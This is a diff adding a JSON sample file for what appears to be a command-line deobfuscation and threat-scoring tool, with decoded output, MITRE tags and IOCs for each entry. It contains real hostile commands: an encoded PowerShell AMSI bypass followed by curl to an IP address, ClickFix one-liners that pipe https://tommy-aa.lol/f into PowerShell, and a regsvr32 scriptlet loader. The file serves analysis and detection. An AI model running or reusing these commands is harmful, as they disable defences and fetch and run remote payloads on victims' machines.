@@ -1,0 +1,650 @@
+[
+  {
+    "name": "Check the Output_is it a correct or still need further decoding?",
+    "input": "/Q /c powershell.exe -noni -nop -w 1 -enc UwBgAGUAVAAtAEkAdABgAGUAbQAgACgAIAAnAFYAJwArACcAYQBSACcAIAArACAAIAAnAEkAQQAnACAAKwAgACgAKAAiAHsAMQB9AHsAMAB9ACIALQBmACcAMQAnACwAJwBiAGwARQA6ACcAKQArACcAcQAyACcAKQAgACAAKwAgACgAJwB1AFoAJwArACcAeAAnACkAIAAgACkAIAAoACAAWwBUAFkAcABFAF0AKAAgACAAIgB7ADEAfQB7ADAAfQAiAC0ARgAnAEYAJwAsACcAcgBFACcAIAAgACkAIAApACAAIAA7ACAAIAAgACAAKAAgACAAIAAgAEcAZQB0AC0AdgBhAHIASQBgAEEAYABCAEwARQAgACAAKAAgACgAJwAxAFEAJwArACcAMgBVACcAKQAgACAAKwAnAHoAWAAnACAAIAApACAAIAAtAFYAYQBMACAAIAApAC4AIgBBAGAAcwBzAGAARQBtAGIAbAB5ACIALgAiAEcARQBUAGAAVABZAGAAUABlACIAKAAoACAAIAAiAHsANgB9AHsAMwB9AHsAMQB9AHsANAB9AHsAMgB9AHsAMAB9AHsANQB9ACIAIAAtAGYAKAAnAFUAdABpACcAKwAnAGwAJwApACwAJwBBACcALAAoACcAQQBtACcAKwAnAHMAaQAnACkALAAoACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwAuAE0AJwAsACcAYQBuACcAKQArACcAYQBnAGUAJwArACcAbQBlAG4AJwArACcAdAAuACcAKQAsACgAJwB1ACcAKwAnAHQAbwAnACsAKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIAIAAtAGYAIAAnAG0AYQAnACwAJwAuACcALAAnAHQAaQBvAG4AJwApACkALAAnAHMAJwAsACgAKAAiAHsAMQB9AHsAMAB9ACIALQBmACAAJwB0ACcALAAnAFMAeQBzACcAKQArACcAZQBtACcAKQAgACAAKQAgACkALgAiAGcAYABlAHQAZgBgAGkARQBsAEQAIgAoACAAIAAoACAAIgB7ADAAfQB7ADIAfQB7ADEAfQAiACAALQBmACgAJwBhACcAKwAnAG0AcwBpACcAKQAsACcAZAAnACwAKAAnAEkAJwArACgAIgB7ADAAfQB7ADEAfQAiACAALQBmACAAJwBuAGkAJwAsACcAdABGACcAKQArACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAgACcAaQBsAGUAJwAsACcAYQAnACkAKQAgACAAKQAsACgAIAAgACIAewAyAH0AewA0AH0AewAwAH0AewAxAH0AewAzAH0AIgAgAC0AZgAgACgAJwBTACcAKwAnAHQAYQB0ACcAKQAsACcAaQAnACwAKAAnAE4AbwBuACcAKwAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAnAHUAYgBsACcALAAnAFAAJwApACsAJwBpACcAKQAsACcAYwAnACwAJwBjACwAJwAgACAAKQApAC4AIgBzAEUAYABUAGAAVgBhAEwAVQBFACIAKAAgACAAJAB7AG4AYABVAEwAbAB9ACwAJAB7AHQAYABSAHUARQB9ACAAKQAgAGMAdQByAGwALgBlAHgAZQAgAGgAdAB0AHAAcwA6AC8ALwAxADAALgAyAC4AMgA3AC4AMwAwAA== (Decoded: S`eT-It`em ( 'V'+'aR' +  'IA' + ((\\\"{1}{0}\\\"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \\\"{1}{0}\\\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\\\"A`ss`Embly\\\".\\\"GET`TY`Pe\\\"((  \\\"{6}{3}{1}{4}{2}{0}{5}\\\" -f('Uti'+'l'),'A',('Am'+'si'),((\\\"{0}{1}\\\" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+(\\\"{0}{2}{1}\\\" -f 'ma','.','tion')),'s',((\\\"{1}{0}\\\"-f 't','Sys')+'em')  ) ).\\\"g`etf`iElD\\\"(  ( \\\"{0}{2}{1}\\\" -f('a'+'msi'),'d',('I'+(\\\"{0}{1}\\\"-f 'ni','tF')+(\\\"{1}{0}\\\"-f 'ile','a'))  ),(  \\\"{2}{4}{0}{1}{3}\\\" -f ('S'+'tat'),'i',('Non'+(\\\"{1}{0}\\\"-f'ubl','P')+'i'),'c','c,'  )).\\\"sE`T`VaLUE\\\"(  ${n`ULl},${t`RuE} ) curl.exe https://10.2.27.30) 1> \\Windows\\Temp\\LYdvqh 2>&1",
+    "input_len": 2442,
+    "engine": "archetype:PS_EncodedCommand+PS_STRING_CONCAT+PS_FORMAT_OPERATOR+archetype:PS_STRING_CONCAT+PS_FORMAT_OPERATOR+archetype:PS_FORMAT_OPERATOR",
+    "chain": [
+      "extract-b64",
+      "utf16le-or-utf8-decode",
+      "ps-string-concat",
+      "ps-format-op",
+      "ps-string-concat",
+      "ps-format-op",
+      "ps-format-op",
+      "ps-format-op",
+      "ps-format-op",
+      "ps-format-op"
+    ],
+    "score": 100,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1059.001",
+      "T1027.010",
+      "T1059.003",
+      "T1027",
+      "T1074.001",
+      "T1562.001"
+    ],
+    "lolbins": [
+      "powershell.exe",
+      "curl.exe"
+    ],
+    "iocs": {
+      "urls": [
+        "https://10.2.27.30"
+      ],
+      "ips": [
+        "10.2.27.30"
+      ],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "SeT-Item ( VaRIA + ((blE:1)+'q2')  + 'uZx'  ) ( [TYpE]'rEF' )  ;    (    Get-varIABLE  '1Q2UzX'  -VaL  ).\"AssEmbly\".\"GETTYPe\"'System.Management.Automation.AmsiUtils'.\"getfiElD\"(  'amsiInitFailed','NonPublic,Static').\"sETVaLUE\"(  ${nULl},${tRuE} ) curl.exe https://10.2.27.30",
+    "post_proc": {}
+  },
+  {
+    "name": "ClickFix",
+    "input": "C:\\\\Windows\\\\system32\\\\cmd.exe /c start  /min cmd /v:on /k echo off&set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&set t2x7=where p*ell.exe&for /f %i in ('!q8k3!')do %i /c for /f %k in ('!r5m9!')do %k h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f^|for /f %j in ('!t2x7!')do %j cmd\",\ncmd.exe /c start /min cmd /v:on /k echo off & for /f %k in ('where curl.exe') do %k https://tommy-aa.lol/f | powershell.exe cmd\nmd /v:on /k echo off&set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&set t2x7=where p*ell.exe&for /f %i in ('!q8k3!')do %i /c for /f %k in ('!r5m9!')do %k https://tommy-aa.lol/f|for /f %j in ('!t2x7!')do %j cmd\nmd.exe /c start /min cmd /v:on /k echo off & set q8k3=where cmd.exe & set r5m9=where curl.exe & set t2x7=where powershell.exe & for /f %i in ('where cmd.exe') do %i /c for /f %k in ('where curl.exe') do %k https://tommy-aa.lol/f ^| for /f %j in ('where powershell.exe') do %j cmd\nmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat\ncmd.exe - < {PATH}:payload.bat\nC:\\Windows\\system32\\cmd.exe /d /s /c C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Browser\\WCChromeExtn\\WCChromeNativeMessagingHost.exe chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/ --parent-window=0 < \\\\.\\pipe\\chrome.nativeMessaging.in.a2d58f022712c4ee > \\\\.\\pipe\\chrome.nativeMessaging.out.a2d58f022712c4ee",
+    "input_len": 1336,
+    "engine": "archetype:CMD_DELAYED_EXPANSION_CARET+LOLBAS_REGSVR32_SCRIPTLET",
+    "chain": [
+      "strip-carets",
+      "cmd-set-collect",
+      "expand-bang-var",
+      "regsvr32-annotate"
+    ],
+    "score": 100,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1059.003",
+      "T1218.010",
+      "T1583.001",
+      "T1027"
+    ],
+    "lolbins": [
+      "regsvr32.exe",
+      "cmd.exe",
+      "curl.exe",
+      "Scrobj.dll"
+    ],
+    "iocs": {
+      "urls": [
+        "https://tommy-aa.lol/f"
+      ],
+      "ips": [],
+      "domains": [
+        "chrome.nativemessaging.in",
+        "tommy-aa.lol"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "# --- Regsvr32 Scriptlet Loader Detected (Squiblydoo) ---\n# T1218.010 \u00b7 Signed Binary Proxy Execution: Regsvr32\n# Scriptlet URL: https://tommy-aa.lol/f|for\nC:\\\\Windows\\\\system32\\\\cmd.exe /c start  /min cmd /v:on /k echo off&set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&set t2x7=where p*ell.exe&for /f %i in ('where cmd.exe ')do %i /c for /f %k in ('where curl.exe ')do %k https://tommy-aa.lol/f|for /f %j in ('where powershell.exe ')do %j cmd\",\ncmd.exe /c start /min cmd /v:on /k echo off & for /f %k in ('where curl.exe') do %k https://tommy-aa.lol/f | powershell.exe cmd\nmd /v:on /k echo off&set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&set t2x7=where p*ell.exe&for /f %i in ('where cmd.exe ')do %i /c for /f %k in ('where curl.exe ')do %k https://tommy-aa.lol/f|for /f %j in ('where powershell.exe ')do %j cmd\nmd.exe /c start /min cmd /v:on /k echo off & set q8k3=where cmd.exe & set r5m9=where curl.exe & set t2x7=where powershell.exe & for /f %i in ('where cmd.exe') do %i /c for /f %k in ('where curl.exe') do %k https://tommy-aa.lol/f | for /f %j in ('where powershell.exe') do %j cmd\nmd.exe /c echo regsvr32.exe /s /u /i:{REMOTEURL:.sct} scrobj.dll > {PATH}:payload.bat\ncmd.exe - < {PATH}:payload.bat\nC:\\Windows\\system32\\cmd.exe /d /s /c C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Browser\\WCChromeExtn\\WCChromeNativeMessagingHost.exe chrome-extension://efaidnbmnnnibpcajpcglclefindmkaj/ --parent-window=0 < \\\\.\\pipe\\chrome.nativeMessaging.in.a2d58f022712c4ee > \\\\.\\pipe\\chrome.nativeMessaging.out.a2d58f022712c4ee",
+    "post_proc": {}
+  },
+  {
+    "name": "ClickFix",
+    "input": "C:\\\\Windows\\\\system32\\\\cmd.exe /c start  /min cmd /v:on /k echo off&set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&set t2x7=where p*ell.exe&for /f %i in ('!q8k3!')do %i /c for /f %k in ('!r5m9!')do %k h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f^|for /f %j in ('!t2x7!')do %j cmd\",",
+    "input_len": 282,
+    "engine": "archetype:CMD_DELAYED_EXPANSION_CARET",
+    "chain": [
+      "strip-carets",
+      "cmd-set-collect",
+      "expand-bang-var"
+    ],
+    "score": 100,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1059.003",
+      "T1583.001",
+      "T1027"
+    ],
+    "lolbins": [
+      "cmd.exe"
+    ],
+    "iocs": {
+      "urls": [
+        "https://tommy-aa.lol/f"
+      ],
+      "ips": [],
+      "domains": [
+        "tommy-aa.lol"
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "C:\\\\Windows\\\\system32\\\\cmd.exe /c start  /min cmd /v:on /k echo off&set q8k3=where c*d.e?e&set r5m9=where c*u*r*l.e?e&set t2x7=where p*ell.exe&for /f %i in ('where c*d.e?e')do %i /c for /f %k in ('where c*u*r*l.e?e')do %k https://tommy-aa.lol/f|for /f %j in ('where p*ell.exe')do %j cmd\",",
+    "post_proc": {}
+  },
+  {
+    "name": "NEW_Alert",
+    "input": "{\\rtf1\\ansi\\ansicpg1252\\cocoartf2870\n\\cocoatextscaling0\\cocoaplatform0{\\fonttbl\\f0\\froman\\fcharset0 Times-Roman;}\n{\\colortbl;\\red255\\green255\\blue255;\\red0\\green0\\blue0;}\n{\\*\\expandedcolortbl;;\\cssrgb\\c0\\c0\\c0;}\n\\paperw11900\\paperh16840\\margl1440\\margr1440\\vieww11520\\viewh8400\\viewkind0\n\\deftab720\n\\pard\\pardeftab720\\partightenfactor0\n\n\\f0\\fs24 \\cf0 \\expnd0\\expndtw0\\kerning0\n\\outl0\\strokewidth0 \\strokec2 NoProfile -NonInteractive -Command \\\\\"if (-not (Get-Variable -Name CODEBUDDY_SAFE_DELETE_PS_READY -Scope Global -ErrorAction SilentlyContinue)) \\{\\\\n $Global:CODEBUDDY_SAFE_DELETE_PS_READY = $true\\\\n\\\\n Add-Type -AssemblyName Microsoft.VisualBasic | Out-Null\\\\n\\\\n function New-SafeDeleteFailClosedMessage \\{\\\\n param(\\\\n [AllowEmptyString()] [string]$Target,\\\\n [string]$Reason,\\\\n [AllowEmptyString()] [string]$Detail = ''\\\\n )\\\\n\\\\n $payload = [ordered]@\\{\\\\n target = $Target\\\\n reason = $Reason\\\\n \\}\\\\n if ($Detail) \\{\\\\n $payload['detail'] = $Detail\\\\n \\}\\\\n return '[safe-delete][SAFE_DELETE_FAIL_CLOSED] ' + ($payload | ConvertTo-Json -Compress)\\\\n \\}\\\\n\\\\n function Write-SafeDeleteReport \\{\\\\n param([string]$Target)\\\\n\\\\n $reportPath = $env:CODEBUDDY_SAFE_DELETE_REPORT_PATH\\\\n if (-not $reportPath) \\{\\\\n return\\\\n \\}\\\\n\\\\n try \\{\\\\n $payload = [ordered]@\\{\\\\n operation = 'trash'\\\\n runtime = 'powershell'\\\\n path = $Target\\\\n timestamp = [int64](([DateTime]::UtcNow - [DateTime]'1970-01-01T00:00:00Z').TotalMilliseconds)\\\\n \\}\\\\n $line = ($payload | ConvertTo-Json -Compress)\\\\n $utf8 = New-Object System.Text.UTF8Encoding -ArgumentList $false\\\\n [System.IO.File]::AppendAllText($reportPath, $line + [Environment]::NewLine, $utf8)\\\\n \\} catch \\{\\\\n # Reporting is best-effort and must never change delete semantics.\\\\n \\}\\\\n \\}\\\\n\\\\n function Get-SafeDeleteComparablePath \\{\\\\n param([string]$Path)\\\\n\\\\n $fullPath = [System.IO.Path]::GetFullPath($Path)\\\\n try \\{\\\\n $info = $null\\\\n if ([System.IO.Directory]::Exists($fullPath)) \\{\\\\n $info = [System.IO.DirectoryInfo]::new($fullPath)\\\\n \\} elseif ([System.IO.File]::Exists($fullPath)) \\{\\\\n $info = [System.IO.FileInfo]::new($fullPath)\\\\n \\}\\\\n if ($null -ne $info) \\{\\\\n $linkTarget = $null\\\\n try \\{\\\\n $linkTarget = $info.ResolveLinkTarget($true)\\\\n \\} catch \\{\\\\n $linkTarget = $null\\\\n \\}\\\\n if ($null -ne $linkTarget) \\{\\\\n $fullPath = [string]$linkTarget.FullName\\\\n \\} else \\{\\\\n $fullPath = [string]$info.FullName\\\\n \\}\\\\n \\}\\\\n \\} catch \\{\\\\n # Fall back to GetFullPath when final target resolution is unavailable.\\\\n \\}\\\\n\\\\n return $fullPath.TrimEnd(\\\\n [System.IO.Path]::DirectorySeparatorChar,\\\\n [System.IO.Path]::AltDirectorySeparatorChar\\\\n )\\\\n \\}\\\\n\\\\n function Test-SafeDeleteTempRootAllowed \\{\\\\n param([string]$Path)\\\\n\\\\n try \\{\\\\n if (-not $Path) \\{\\\\n return $false\\\\n \\}\\\\n $fullPath = Get-SafeDeleteComparablePath $Path\\\\n $rootPath = Get-SafeDeleteComparablePath ([System.IO.Path]::GetPathRoot($fullPath))\\\\n if ($fullPath -eq $rootPath) \\{\\\\n return $false\\\\n \\}\\\\n return [System.IO.Directory]::Exists($fullPath)\\\\n \\} catch \\{\\\\n return $false\\\\n \\}\\\\n \\}\\\\n\\\\n function Test-SafeDeleteUnderOsTemp \\{\\\\n param([string]$Target)\\\\n\\\\n try \\{\\\\n if (-not (Test-SafeDeleteTempRootAllowed ([System.IO.Path]::GetTempPath()))) \\{\\\\n return $false\\\\n \\}\\\\n $tmpPath = Get-SafeDeleteComparablePath ([System.IO.Path]::GetTempPath())\\\\n $targetPath = Get-SafeDeleteComparablePath $Target\\\\n if ($targetPath.Length -le $tmpPath.Length) \\{\\\\n return $false\\\\n \\}\\\\n if (-not $targetPath.StartsWith($tmpPath, [System.StringComparison]::OrdinalIgnoreCase)) \\{\\\\n return $false\\\\n \\}\\\\n $separator = $targetPath.Substring($tmpPath.Length, 1)\\\\n if (($separator -ne [System.IO.Path]::DirectorySeparatorChar) -and ($separator -ne [System.IO.Path]::AltDirectorySeparatorChar)) \\{\\\\n return $false\\\\n \\}\\\\n return $true\\\\n \\} catch \\{\\\\n return $false\\\\n \\}\\\\n \\}\\\\n\\\\n function Invoke-SafeDeleteBulkGuard \\{\\\\n param([string[]]$Targets)\\\\n\\\\n if (-not $env:CODEBUDDY_SAFE_DELETE_BULK_GUARD -or\\\\n -not $env:CODEBUDDY_NODE_BIN -or\\\\n -not $env:CODEBUDDY_SAFE_DELETE_BULK_STATE_DIR -or\\\\n -not $env:CODEBUDDY_TOOL_CALL_ID) \\{\\\\n return\\\\n \\}\\\\n if (-not $Targets -or $Targets.Count -eq 0) \\{\\\\n return\\\\n \\}\\\\n\\\\n $guardArgs = New-Object System.Collections.Generic.List[string]\\\\n $guardArgs.Add('check')\\\\n foreach ($target in $Targets) \\{\\\\n $guardArgs.Add('--target')\\\\n $guardArgs.Add($target)\\\\n \\}\\\\n\\\\n $previousNodeOptions = $env:NODE_OPTIONS\\\\n try \\{\\\\n $env:NODE_OPTIONS = ''\\\\n $output = & $env:CODEBUDDY_NODE_BIN $env:CODEBUDDY_SAFE_DELETE_BULK_GUARD $guardArgs.ToArray() 2>&1\\\\n $exitCode = $LASTEXITCODE\\\\n \\} finally \\{\\\\n $env:NODE_OPTIONS = $previousNodeOptions\\\\n \\}\\\\n\\\\n if ($exitCode -ne 0) \\{\\\\n $trimmedOutput = ($output | Out-String).TrimEnd()\\\\n if ($trimmedOutput) \\{\\\\n # PTY \\uc0\\u36335 \\u24452 \\u19979  stderr \\u21487 \\u33021 \\u20002 \\u22833 \\u65292 \\u39069 \\u22806 \\u20889 \\u21040  stdout \\u20445 \\u38556  orchestrator \\u21487 \\u35265  marker\\u12290 \\\\n [Console]::Out.WriteLine($trimmedOutput)\\\\n [Console]::Error.WriteLine($trimmedOutput)\\\\n # \\u30452 \\u25509 \\u25243 \\u20986  guard \\u21407 \\u22987  marker\\u65292 \\u30830 \\u20445  orchestrator \\u33021 \\u20174 \\u21629 \\u20196 \\u36755 \\u20986 \\u20013 \\u21629 \\u20013 \\\\n # SAFE_DELETE_BULK_CONFIRM_REQUIRED / SAFE_DELETE_BULK_REJECTED\\u12290 \\\\n throw $trimmedOutput\\\\n \\}\\\\n throw '[safe-delete][SAFE_DELETE_BULK_GUARD_ERROR] bulk delete guard blocked deletion'\\\\n \\}\\\\n \\}\\\\n\\\\n function global:Remove-Item \\{\\\\n [CmdletBinding()]\\\\n param([Parameter(ValueFromRemainingArguments = $true)] [object[]]$RawArgs)\\\\n\\\\n $force = $false\\\\n $recursive = $false\\\\n $allowDir = $false\\\\n $interactive = $false\\\\n $whatIf = $false\\\\n $confirm = $false\\\\n $afterDoubleDash = $false\\\\n $pendingPathMode = $null\\\\n $pendingSwitchMode = $null\\\\n $targetSpecs = New-Object System.Collections.Generic.List[object]\\\\n\\\\n foreach ($raw in $RawArgs) \\{\\\\n $arg = [string]$raw\\\\n\\\\n if ($null -ne $pendingSwitchMode) \\{\\\\n if ($arg -match '^(?i)(\\\\$?true|1)$') \\{\\\\n if ($pendingSwitchMode -eq 'force') \\{ $force = $true \\}\\\\n elseif ($pendingSwitchMode -eq 'recurse') \\{ $recursive = $true \\}\\\\n elseif ($pendingSwitchMode -eq 'whatif') \\{ $whatIf = $true \\}\\\\n elseif ($pendingSwitchMode -eq 'confirm') \\{ $confirm = $true \\}\\\\n $pendingSwitchMode = $null\\\\n continue\\\\n \\}\\\\n if ($arg -match '^(?i)(\\\\$?false|0)$') \\{\\\\n if ($pendingSwitchMode -eq 'force') \\{ $force = $false \\}\\\\n elseif ($pendingSwitchMode -eq 'recurse') \\{ $recursive = $false \\}\\\\n elseif ($pendingSwitchMode -eq 'whatif') \\{ $whatIf = $false \\}\\\\n elseif ($pendingSwitchMode -eq 'confirm') \\{ $confirm = $false \\}\\\\n $pendingSwitchMode = $null\\\\n continue\\\\n \\}\\\\n throw 'Remove-Item: invalid boolean value for -' + $pendingSwitchMode + ': ' + $arg\\\\n \\}\\\\n\\\\n if ($null -ne $pendingPathMode) \\{\\\\n $targetSpecs.Add([pscustomobject]@\\{\\\\n Value = $arg\\\\n IsLiteral = ($pendingPathMode -eq 'literal')\\\\n \\})\\\\n $pendingPathMode = $null\\\\n continue\\\\n \\}\\\\n\\\\n if (-not $afterDoubleDash) \\{\\\\n if ($arg -eq '--') \\{ $afterDoubleDash = $true; continue \\}\\\\n\\\\n if ($arg -match '^(?i)-Path:(.+)$') \\{\\\\n $targetSpecs.Add([pscustomobject]@\\{ Value = $Matches[1]; IsLiteral = $false \\})\\\\n continue\\\\n \\}\\\\n if ($arg -match '^(?i)-LiteralPath:(.+)$') \\{\\\\n $targetSpecs.Add([pscustomobject]@\\{ Value = $Matches[1]; IsLiteral = $true \\})\\\\n continue\\\\n \\}\\\\n\\\\n if ($arg -match '^(?i)-Path$') \\{ $pendingPathMode = 'path'; continue \\}\\\\n if ($arg -match '^(?i)-LiteralPath$') \\{ $pendingPathMode = 'literal'; continue \\}\\\\n if ($arg -match '^(?i)-f$|^(?i)--force$|^(?i)-Force$') \\{ $force = $true; continue \\}\\\\n if ($arg -match '^(?i)-r$|^(?i)-R$|^(?i)--recursive$|^(?i)-Recurse$') \\{ $recursive = $true; continue \\}\\\\n if ($arg -match '^(?i)-d$|^(?i)--dir$|^(?i)--directory$') \\{ $allowDir = $true; continue \\}\\\\n if ($arg -match '^(?i)-i$|^(?i)-I$|^(?i)--interactive(?:=.*)?$') \\{ $interactive = $true; continue \\}\\\\n if ($arg -match '^(?i)-WhatIf$') \\{ $whatIf = $true; continue \\}\\\\n if ($arg -match '^(?i)-Confirm$') \\{ $confirm = $true; continue \\}\\\\n\\\\n if ($arg -match '^(?i)-Force:(\\\\$?true|1)$') \\{ $force = $true; continue \\}\\\\n if ($arg -match '^(?i)-Force:(\\\\$?false|0)$') \\{ $force = $false; continue \\}\\\\n if ($arg -match '^(?i)-Recurse:(\\\\$?true|1)$') \\{ $recursive = $true; continue \\}\\\\n if ($arg -match '^(?i)-Recurse:(\\\\$?false|0)$') \\{ $recursive = $false; continue \\}\\\\n if ($arg -match '^(?i)-WhatIf:(\\\\$?true|1)$') \\{ $whatIf = $true; continue \\}\\\\n if ($arg -match '^(?i)-WhatIf:(\\\\$?false|0)$') \\{ $whatIf = $false; continue \\}\\\\n if ($arg -match '^(?i)-Confirm:(\\\\$?true|1)$') \\{ $confirm = $true; continue \\}\\\\n if ($arg -match '^(?i)-Confirm:(\\\\$?false|0)$') \\{ $confirm = $false; continue \\}\\\\n if ($arg -match '^(?i)-Force:$') \\{ $pendingSwitchMode = 'force'; continue \\}\\\\n if ($arg -match '^(?i)-Recurse:$') \\{ $pendingSwitchMode = 'recurse'; continue \\}\\\\n if ($arg -match '^(?i)-WhatIf:$') \\{ $pendingSwitchMode = 'whatif'; continue \\}\\\\n if ($arg -match '^(?i)-Confirm:$') \\{ $pendingSwitchMode = 'confirm'; continue \\}\\\\n\\\\n # \\u20165 \\u25903 \\u25345  rm \\u39118 \\u26684 \\u30701 \\u21442 \\u25968 \\u32452 \\u21512 \\u65306 -rf/-fr/-di \\u31561 \\\\n if ($arg -match '^-[fFrRdDiI]\\{2,\\}$') \\{\\\\n if ($arg -match '[fF]') \\{ $force = $true \\}\\\\n if ($arg -match '[rR]') \\{ $recursive = $true \\}\\\\n if ($arg -match '[dD]') \\{ $allowDir = $true \\}\\\\n if ($arg -match '[iI]') \\{ $interactive = $true \\}\\\\n continue\\\\n \\}\\\\n\\\\n if ($arg.StartsWith('-')) \\{\\\\n throw 'Remove-Item: unsupported option in safe-delete wrapper: ' + $arg\\\\n \\}\\\\n \\}\\\\n\\\\n $targetSpecs.Add([pscustomobject]@\\{ Value = $arg; IsLiteral = $false \\})\\\\n \\}\\\\n\\\\n if ($null -ne $pendingPathMode) \\{\\\\n throw 'Remove-Item: missing value for -Path/-LiteralPath'\\\\n \\}\\\\n if ($null -ne $pendingSwitchMode) \\{\\\\n throw 'Remove-Item: missing boolean value for -' + $pendingSwitchMode + ':'\\\\n \\}\\\\n\\\\n if ($targetSpecs.Count -eq 0 -and $MyInvocation.ExpectingInput) \\{\\\\n $pipelinePathSeen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)\\\\n foreach ($pipedItem in $input) \\{\\\\n if ($null -eq $pipedItem) \\{ continue \\}\\\\n\\\\n $candidatePath = ''\\\\n if ($pipedItem -is [string]) \\{\\\\n $candidatePath = [string]$pipedItem\\\\n \\} elseif ($pipedItem -is [System.IO.FileSystemInfo]) \\{\\\\n $candidatePath = [string]$pipedItem.FullName\\\\n \\} elseif ($pipedItem -is [System.Management.Automation.PathInfo]) \\{\\\\n $candidatePath = [string]$pipedItem.Path\\\\n \\} elseif ($pipedItem.PSObject.Properties['FullName']) \\{\\\\n $candidatePath = [string]$pipedItem.FullName\\\\n \\} elseif ($pipedItem.PSObject.Properties['Path']) \\{\\\\n $candidatePath = [string]$pipedItem.Path\\\\n \\} else \\{\\\\n $candidatePath = [string]$pipedItem\\\\n \\}\\\\n\\\\n if (-not [string]::IsNullOrWhiteSpace($candidatePath) -and $pipelinePathSeen.Add($candidatePath)) \\{\\\\n $targetSpecs.Add([pscustomobject]@\\{\\\\n Value = $candidatePath\\\\n IsLiteral = $true\\\\n \\})\\\\n \\}\\\\n \\}\\\\n \\}\\\\n\\\\n if ($interactive) \\{\\\\n throw (New-SafeDeleteFailClosedMessage '' 'interactive-not-supported')\\\\n \\}\\\\n\\\\n if ($targetSpecs.Count -eq 0) \\{\\\\n throw 'Remove-Item: missing path operand'\\\\n \\}\\\\n\\\\n $trashBin = $env:CODEBUDDY_SAFE_DELETE_TRASH_BIN\\\\n if (-not $trashBin -and $env:GENIE_TRASH_DIR) \\{\\\\n $arch = if (($env:PROCESSOR_ARCHITECTURE -as [string]) -match 'ARM64') \\{ 'arm64' \\} else \\{ 'x64' \\}\\\\n $trashBin = Join-Path -Path $env:GENIE_TRASH_DIR -ChildPath ('win32-' + $arch + '.exe')\\\\n \\}\\\\n\\\\n $safeDeleteTargets = New-Object System.Collections.Generic.List[string]\\\\n $safeDeleteItems = New-Object System.Collections.Generic.List[object]\\\\n\\\\n foreach ($targetSpec in $targetSpecs) \\{\\\\n if ($targetSpec.IsLiteral) \\{\\\\n $resolvedItems = @(Microsoft.PowerShell.Management\\\\Resolve-Path -LiteralPath $targetSpec.Value -ErrorAction SilentlyContinue)\\\\n \\} else \\{\\\\n $resolvedItems = @(Microsoft.PowerShell.Management\\\\Resolve-Path -Path $targetSpec.Value -ErrorAction SilentlyContinue)\\\\n \\}\\\\n\\\\n if ($resolvedItems.Count -eq 0) \\{\\\\n if ($force) \\{ continue \\}\\\\n throw (New-SafeDeleteFailClosedMessage $targetSpec.Value 'path-not-found')\\\\n \\}\\\\n\\\\n foreach ($resolved in $resolvedItems) \\{\\\\n $resolvedPath = [string]$resolved.Path\\\\n $providerName = [string]$resolved.Provider.Name\\\\n\\\\n # \\u20165 \\u23545  FileSystem \\u36208  safe-delete\\u65307 \\u20854 \\u20182  provider \\u36879 \\u20256 \\u20869 \\u32622  Remove-Item\\\\n if ($providerName -ne 'FileSystem' -or $whatIf) \\{\\\\n $delegateArgs = @\\{\\\\n LiteralPath = $resolvedPath\\\\n ErrorAction = 'Stop'\\\\n \\}\\\\n if ($force) \\{ $delegateArgs['Force'] = $true \\}\\\\n if ($recursive) \\{ $delegateArgs['Recurse'] = $true \\}\\\\n if ($whatIf) \\{ $delegateArgs['WhatIf'] = $true \\}\\\\n if ($confirm) \\{ $delegateArgs['Confirm'] = $true \\}\\\\n Microsoft.PowerShell.Management\\\\Remove-Item @delegateArgs\\\\n continue\\\\n \\}\\\\n\\\\n $isDir = Microsoft.PowerShell.Management\\\\Test-Path -LiteralPath $resolvedPath -PathType Container\\\\n $safeDeleteTargets.Add($resolvedPath)\\\\n $safeDeleteItems.Add([pscustomobject]@\\{\\\\n TargetSpec = $targetSpec.Value\\\\n ResolvedPath = $resolvedPath\\\\n IsDir = $isDir\\\\n \\})\\\\n \\}\\\\n \\}\\\\n\\\\n $guardedSafeDeleteTargets = New-Object System.Collections.Generic.List[string]\\\\n $guardedSafeDeleteItems = New-Object System.Collections.Generic.List[object]\\\\n\\\\n foreach ($item in $safeDeleteItems) \\{\\\\n $resolvedPath = [string]$item.ResolvedPath\\\\n\\\\n if (Test-SafeDeleteUnderOsTemp $resolvedPath) \\{\\\\n $tmpDelegateArgs = @\\{\\\\n LiteralPath = $resolvedPath\\\\n ErrorAction = 'Stop'\\\\n \\}\\\\n if ($force) \\{ $tmpDelegateArgs['Force'] = $true \\}\\\\n if ($recursive) \\{ $tmpDelegateArgs['Recurse'] = $true \\}\\\\n Microsoft.PowerShell.Management\\\\Remove-Item @tmpDelegateArgs\\\\n continue\\\\n \\}\\\\n\\\\n $guardedSafeDeleteTargets.Add($resolvedPath)\\\\n $guardedSafeDeleteItems.Add($item)\\\\n \\}\\\\n\\\\n Invoke-SafeDeleteBulkGuard -Targets $guardedSafeDeleteTargets.ToArray()\\\\n\\\\n foreach ($item in $guardedSafeDeleteItems) \\{\\\\n $targetValue = [string]$item.TargetSpec\\\\n 